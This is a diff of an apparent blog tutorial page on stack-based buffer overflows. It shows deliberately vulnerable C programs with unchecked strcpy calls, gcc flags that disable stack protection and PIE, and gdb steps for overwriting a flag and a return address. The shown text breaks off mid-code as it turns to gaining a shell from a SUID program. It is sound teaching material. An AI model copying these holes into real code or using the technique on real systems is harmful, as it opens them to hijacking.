@@ -7,6 +7,9 @@
 <title>Stack-based buffer overflows | danielorihuela</title>
 <link rel=stylesheet href=/css/page.css>
 <script type=module src=/js/frame/index.js></script>
+<link rel=stylesheet href=/css/code.css>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js></script>
+<script>hljs.highlightAll()</script>
 </head>
 <body>
 <span class=title>
@@ -39,51 +42,51 @@ Back
 <p>All the vulnerable programs are from <strong>Hacking: The Art of Exploitation, 2nd Edition</strong>. They may contain modification to use in modern machines. You can get the original source code <a href=https://github.com/intere/hacking/blob/master/booksrc>https://github.com/intere/hacking/blob/master/booksrc</a>.</p>
 <h3 id=overwrite-local-variable-in-stack-frame>Overwrite local variable in stack frame</h3>
 <p>Let&rsquo;s start with the <code>auth_overflow.c</code>.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>
-  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>check_authentication</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>password) {
-    <span style=color:#66d9ef>int</span> auth_flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-    <span style=color:#66d9ef>char</span> password_buffer[<span style=color:#ae81ff>16</span>];
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c>  <span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+  <span class=kt>int</span> <span class=nf>check_authentication</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>password</span><span class=p>)</span> <span class=p>{</span>
+    <span class=kt>int</span> <span class=n>auth_flag</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+    <span class=kt>char</span> <span class=n>password_buffer</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
 
-    strcpy(password_buffer, password);
+    <span class=n>strcpy</span><span class=p>(</span><span class=n>password_buffer</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
 
-    <span style=color:#66d9ef>if</span>(strcmp(password_buffer, <span style=color:#e6db74>&#34;brillig&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
-      auth_flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
-    <span style=color:#66d9ef>if</span>(strcmp(password_buffer, <span style=color:#e6db74>&#34;outgrabe&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
-      auth_flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+    <span class=k>if</span><span class=p>(</span><span class=n>strcmp</span><span class=p>(</span><span class=n>password_buffer</span><span class=p>,</span> <span class=s>&#34;brillig&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
+      <span class=n>auth_flag</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+    <span class=k>if</span><span class=p>(</span><span class=n>strcmp</span><span class=p>(</span><span class=n>password_buffer</span><span class=p>,</span> <span class=s>&#34;outgrabe&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
+      <span class=n>auth_flag</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
 
-    <span style=color:#66d9ef>return</span> auth_flag;
-  }
+    <span class=k>return</span> <span class=n>auth_flag</span><span class=p>;</span>
+  <span class=p>}</span>
 
-  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[]) {
-    <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>) {
-      printf(<span style=color:#e6db74>&#34;Usage: %s &lt;password&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
-      exit(<span style=color:#ae81ff>0</span>);
-    }
-    <span style=color:#66d9ef>if</span>(check_authentication(argv[<span style=color:#ae81ff>1</span>])) {
-      printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-      printf(<span style=color:#e6db74>&#34;      Access Granted.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-      printf(<span style=color:#e6db74>&#34;-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-    } <span style=color:#66d9ef>else</span> {
-      printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Access Denied.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-    }
-  }
+  <span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span> <span class=p>{</span>
+    <span class=k>if</span><span class=p>(</span><span class=n>argc</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
+      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Usage: %s &lt;password&gt;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
+      <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=k>if</span><span class=p>(</span><span class=n>check_authentication</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=p>{</span>
+      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;      Access Granted.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Access Denied.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=p>}</span>
+  <span class=p>}</span>
 </code></pre></div><p>The program is simple. It receives a password. If it&rsquo;s equal to &ldquo;brillig&rdquo; or &ldquo;outgrabe&rdquo; we will see the message &ldquo;Access Granted&rdquo;, otherwise, we will see &ldquo;Access Denied&rdquo;. With a buffer overflow, we can get the &ldquo;Access Granted&rdquo; message even when the password is invalid.</p>
 <p>The error is inside the <code>check_authentication</code> function, which copies the <code>password</code> data to the <code>password_buffer</code> without checking the length. Notice that the <code>password_buffer</code> can hold a maximum of 16 bytes. In other words, the program will reserve 16 bytes in the stack for that variable. Nevertheless, the data behind the <code>password</code> pointer can hold a larger array of characters. The idea here is to give the program a password longer than 16 bytes so that when the data is copied into the <code>password_buffer</code>, the extra bytes overwrite the <code>auth_flag</code>. That&rsquo;s the boolean that decides the message to be shown. If we can control it, we can control the printed message. Remember that the stack frame is a LIFO. Hence, the <code>password_buffer</code> will be on top of the <code>auth_flag</code>.</p>
 <p>Let&rsquo;s compile the program and execute it with a bigger password than expected.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gcc auth_overflow.c -o auth_overflow
-./auth_overflow <span style=color:#e6db74>&#34;password&#34;</span>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>gcc auth_overflow.c -o auth_overflow
+./auth_overflow <span class=s2>&#34;password&#34;</span>
 </code></pre></div><p>I&rsquo;ve tried with several lengths. With 25 characters, the program fails.</p>
 <figure class=centered-image><img src=/images/stack-based-buffer-overflow/auth-overflow-stack-smashing.png>
 </figure>
 <p>There&rsquo;s something curious, though. The function variables only take 20 bytes, 16 for the <code>password_buffer</code> and 4 for the <code>auth_flag</code>, but we need 25 bytes to make it fail. I did some research, and it seems like it could be related to some padding that the compiler or the system is adding between variables. In any case, the program is failing with &ldquo;stack smashing&rdquo;. That tells us that the compiler detected the buffer overflow attack and stoped the execution. Current versions of GCC use &ldquo;canaries&rdquo; to detect buffer overflows. It adds some data in the stack frame at the beginning of the function and expects that it remains unchanged when exiting it. Let&rsquo;s disable that for our learning.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gcc auth_overflow.c -o auth_overflow -fno-stack-protector
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>gcc auth_overflow.c -o auth_overflow -fno-stack-protector
 </code></pre></div><figure class=centered-image><img src=/images/stack-based-buffer-overflow/auth-overflow-no-stack-protector.png>
 </figure>
 <p>With canaries disabled, let&rsquo;s see how many bytes are between the <code>password_buffer</code> and the <code>auth_flag</code>. That will tell us the password length needed to overwrite the <code>auth_flag</code>. For that, we can use gdb. It&rsquo;s only a matter of placing a breakpoint inside the vulnerable function and checking the memory addresses.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gcc auth_overflow.c -o auth_overflow -fno-stack-protector -g <span style=color:#75715e># -g option adds debug symbols</span>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>gcc auth_overflow.c -o auth_overflow -fno-stack-protector -g <span class=c1># -g option adds debug symbols</span>
 gdb ./auth_overflow
 </code></pre></div><figure class=centered-image><img src=/images/stack-based-buffer-overflow/auth-overflow-gdb-variables-distance.png width=1275px>
 </figure>
@@ -95,39 +98,39 @@ gdb ./auth_overflow
 </figure>
 <h3 id=overwrite-return-address>Overwrite return address</h3>
 <p>The first example is limited, right? We can do something interesting only if the variable we want to overwrite is stored in the stack before the one we are using to exploit it. What could we do if the variable is not there or appears after? The idea in that situation is to overwrite the return address.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>
-  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>check_authentication</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>password) {
-    <span style=color:#66d9ef>char</span> password_buffer[<span style=color:#ae81ff>16</span>];
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c>  <span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+  <span class=kt>int</span> <span class=nf>check_authentication</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>password</span><span class=p>)</span> <span class=p>{</span>
+    <span class=kt>char</span> <span class=n>password_buffer</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
 
-    strcpy(password_buffer, password);
+    <span class=n>strcpy</span><span class=p>(</span><span class=n>password_buffer</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
 
-    <span style=color:#66d9ef>int</span> auth_flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-    <span style=color:#66d9ef>if</span>(strcmp(password_buffer, <span style=color:#e6db74>&#34;brillig&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
-      auth_flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
-    <span style=color:#66d9ef>if</span>(strcmp(password_buffer, <span style=color:#e6db74>&#34;outgrabe&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
-      auth_flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+    <span class=kt>int</span> <span class=n>auth_flag</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+    <span class=k>if</span><span class=p>(</span><span class=n>strcmp</span><span class=p>(</span><span class=n>password_buffer</span><span class=p>,</span> <span class=s>&#34;brillig&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
+      <span class=n>auth_flag</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+    <span class=k>if</span><span class=p>(</span><span class=n>strcmp</span><span class=p>(</span><span class=n>password_buffer</span><span class=p>,</span> <span class=s>&#34;outgrabe&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
+      <span class=n>auth_flag</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
 
-    <span style=color:#66d9ef>return</span> auth_flag;
-  }
+    <span class=k>return</span> <span class=n>auth_flag</span><span class=p>;</span>
+  <span class=p>}</span>
 
-  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[]) {
-    <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>) {
-      printf(<span style=color:#e6db74>&#34;Usage: %s &lt;password&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
-      exit(<span style=color:#ae81ff>0</span>);
-    }
-    <span style=color:#66d9ef>if</span>(check_authentication(argv[<span style=color:#ae81ff>1</span>])) {
-      printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-      printf(<span style=color:#e6db74>&#34;      Access Granted.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-      printf(<span style=color:#e6db74>&#34;-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-    } <span style=color:#66d9ef>else</span> {
-      printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Access Denied.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-    }
-  }
+  <span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span> <span class=p>{</span>
+    <span class=k>if</span><span class=p>(</span><span class=n>argc</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
+      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Usage: %s &lt;password&gt;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
+      <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=k>if</span><span class=p>(</span><span class=n>check_authentication</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=p>{</span>
+      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;      Access Granted.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Access Denied.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=p>}</span>
+  <span class=p>}</span>
 </code></pre></div><p>First, compile it without security protections and debug symbols. Here we added the <code>no-pie</code> option. PIE stands for Position Independent Executable. If enabled, the executable will be loaded in a different memory address every time.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gcc auth_overflow2.c -o auth_overflow2 -fno-stack-protector -no-pie -g
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>gcc auth_overflow2.c -o auth_overflow2 -fno-stack-protector -no-pie -g
 </code></pre></div><p>Now, where is the return address? How can we overwrite it? As in the first example, gdb is our friend. We can put a breakpoint inside <code>check_authentication</code>, run and execute <code>info frame</code>. The <code>rip</code> register contains the return address.</p>
 <figure class=centered-image><img src=/images/stack-based-buffer-overflow/auth-overflow2-info-frame.png width=1275px>
 </figure>
@@ -143,174 +146,174 @@ gdb ./auth_overflow
 <h3 id=get-shell>Get shell</h3>
 <p>The second example was a bit more interesting, but still limited. In this final example, we are going to see how to get access to a shell.</p>
 <p>We have two small programs. The first program creates notes in &ldquo;/var/notes&rdquo;. root must own the executable and have the SUID activated. That way, we can execute it with normal users as if it was root.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/stat.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;hacking.h&#34;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>
-  <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>usage</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>prog_name, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>filename)
-  {
-    printf(<span style=color:#e6db74>&#34;Usage: %s &lt;data to add to %s&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, prog_name, filename);
-    exit(<span style=color:#ae81ff>0</span>);
-  }
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c>  <span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&#34;hacking.h&#34;</span><span class=cp>
+</span><span class=cp></span>
+  <span class=kt>void</span> <span class=nf>usage</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>prog_name</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>filename</span><span class=p>)</span>
+  <span class=p>{</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Usage: %s &lt;data to add to %s&gt;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>prog_name</span><span class=p>,</span> <span class=n>filename</span><span class=p>);</span>
+    <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+  <span class=p>}</span>
 
-  <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>fatal</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>);            <span style=color:#75715e>// A function for fatal errors
-</span><span style=color:#75715e></span>  <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>ec_malloc</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>); <span style=color:#75715e>// An error-checked malloc() wrapper
-</span><span style=color:#75715e></span>
-  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[])
-  {
-    <span style=color:#66d9ef>int</span> userid, fd; <span style=color:#75715e>// File descriptor
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buffer, <span style=color:#f92672>*</span>datafile;
+  <span class=kt>void</span> <span class=nf>fatal</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>);</span>            <span class=c1>// A function for fatal errors
+</span><span class=c1></span>  <span class=kt>void</span> <span class=o>*</span><span class=nf>ec_malloc</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>);</span> <span class=c1>// An error-checked malloc() wrapper
+</span><span class=c1></span>
+  <span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
+  <span class=p>{</span>
+    <span class=kt>int</span> <span class=n>userid</span><span class=p>,</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// File descriptor
+</span><span class=c1></span>    <span class=kt>char</span> <span class=o>*</span><span class=n>buffer</span><span class=p>,</span> <span class=o>*</span><span class=n>datafile</span><span class=p>;</span>
 
-    buffer <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)ec_malloc(<span style=color:#ae81ff>100</span>);
-    datafile <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)ec_malloc(<span style=color:#ae81ff>20</span>);
-    strcpy(datafile, <span style=color:#e6db74>&#34;/var/notes&#34;</span>);
+    <span class=n>buffer</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ec_malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
+    <span class=n>datafile</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ec_malloc</span><span class=p>(</span><span class=mi>20</span><span class=p>);</span>
+    <span class=n>strcpy</span><span class=p>(</span><span class=n>datafile</span><span class=p>,</span> <span class=s>&#34;/var/notes&#34;</span><span class=p>);</span>
 
-    <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>)                 <span style=color:#75715e>// If there aren&#39;t command-line arguments,
-</span><span style=color:#75715e></span>      usage(argv[<span style=color:#ae81ff>0</span>], datafile); <span style=color:#75715e>// display usage message and exit.
-</span><span style=color:#75715e></span>
-    strcpy(buffer, argv[<span style=color:#ae81ff>1</span>]); <span style=color:#75715e>// Copy into buffer.
-</span><span style=color:#75715e></span>
-    printf(<span style=color:#e6db74>&#34;[DEBUG] buffer @ %p: </span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#39;\n</span><span style=color:#e6db74>&#34;</span>, buffer, buffer);
-    printf(<span style=color:#e6db74>&#34;[DEBUG] datafile @ %p: </span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#39;\n</span><span style=color:#e6db74>&#34;</span>, datafile, datafile);
+    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span>                 <span class=c1>// If there aren&#39;t command-line arguments,
+</span><span class=c1></span>      <span class=n>usage</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>datafile</span><span class=p>);</span> <span class=c1>// display usage message and exit.
+</span><span class=c1></span>
+    <span class=n>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span> <span class=c1>// Copy into buffer.
+</span><span class=c1></span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;[DEBUG] buffer @ %p: </span><span class=se>\&#39;</span><span class=s>%s</span><span class=se>\&#39;\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buffer</span><span class=p>,</span> <span class=n>buffer</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;[DEBUG] datafile @ %p: </span><span class=se>\&#39;</span><span class=s>%s</span><span class=se>\&#39;\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>datafile</span><span class=p>,</span> <span class=n>datafile</span><span class=p>);</span>
 
-    <span style=color:#75715e>// Opening the file
-</span><span style=color:#75715e></span>    fd <span style=color:#f92672>=</span> open(datafile, O_WRONLY <span style=color:#f92672>|</span> O_CREAT <span style=color:#f92672>|</span> O_APPEND, S_IRUSR <span style=color:#f92672>|</span> S_IWUSR);
-    <span style=color:#66d9ef>if</span> (fd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
-      fatal(<span style=color:#e6db74>&#34;in main() while opening file&#34;</span>);
-    printf(<span style=color:#e6db74>&#34;[DEBUG] file descriptor is %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, fd);
+    <span class=c1>// Opening the file
+</span><span class=c1></span>    <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=n>datafile</span><span class=p>,</span> <span class=n>O_WRONLY</span> <span class=o>|</span> <span class=n>O_CREAT</span> <span class=o>|</span> <span class=n>O_APPEND</span><span class=p>,</span> <span class=n>S_IRUSR</span> <span class=o>|</span> <span class=n>S_IWUSR</span><span class=p>);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
+      <span class=n>fatal</span><span class=p>(</span><span class=s>&#34;in main() while opening file&#34;</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;[DEBUG] file descriptor is %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fd</span><span class=p>);</span>
 
-    userid <span style=color:#f92672>=</span> getuid(); <span style=color:#75715e>// Get the real user ID.
-</span><span style=color:#75715e></span>
-    <span style=color:#75715e>// Writing data
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (write(fd, <span style=color:#f92672>&amp;</span>userid, <span style=color:#ae81ff>4</span>) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) <span style=color:#75715e>// Write user ID before note data.
-</span><span style=color:#75715e></span>      fatal(<span style=color:#e6db74>&#34;in main() while writing userid to file&#34;</span>);
-    write(fd, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>1</span>);                          <span style=color:#75715e>// Terminate line.
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (write(fd, buffer, strlen(buffer)) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) <span style=color:#75715e>// Write note.
-</span><span style=color:#75715e></span>      fatal(<span style=color:#e6db74>&#34;in main() while writing buffer to file&#34;</span>);
+    <span class=n>userid</span> <span class=o>=</span> <span class=n>getuid</span><span class=p>();</span> <span class=c1>// Get the real user ID.
+</span><span class=c1></span>
+    <span class=c1>// Writing data
